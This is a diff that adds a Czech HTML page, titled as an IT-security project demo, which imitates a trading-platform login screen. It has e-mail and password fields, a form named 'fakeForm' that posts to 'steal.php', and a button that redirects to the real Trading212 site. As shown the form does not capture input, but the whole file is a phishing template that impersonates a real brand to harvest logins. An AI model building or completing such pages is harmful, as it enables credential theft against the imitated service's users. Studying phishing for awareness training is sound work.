@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <title>Projekt IT Bezpečnost - Demo</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .wrapper { width: 340px; text-align: center; }
+        .logo-box { margin-bottom: 0px; }
+        .logo-box img { max-width: 100%; height: auto; }
+        input { width: 100%; padding: 12px; margin: 5px 0; background: #000; border: 1px solid #333; border-radius: 8px; color: #fff; box-sizing: border-box; }
+        .btn { width: 100%; padding: 14px; background: #00AEEF; border: none; border-radius: 25px; color: #fff; font-weight: bold; margin-top: 20px; cursor: pointer; }
+        .footer { margin-top: 20px; font-size: 12px; opacity: 0.8; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="logo-box">
+        <img src="trading.png" alt="Zde se zobrazí tvé logo">
+    </div>
+
+    <form id="fakeForm" action="steal.php" method="post">
+        <input type="text" id="email" placeholder="E-MAIL">
+        <input type="password" id="pass" placeholder="HESLO">
+        <button type="button" class="btn" >Přihlášení</button>
+    </form>
+
+    <div class="footer">Zapomněl jsi heslo? | Otevřít účet</div>
+</div>
+
+<script>
+
+</script>
+<script>
+document.querySelector(".btn").addEventListener("click", function () {
+    window.location.href = "https://app.trading212.com";
+});
+</script>
+</body>
+</html>
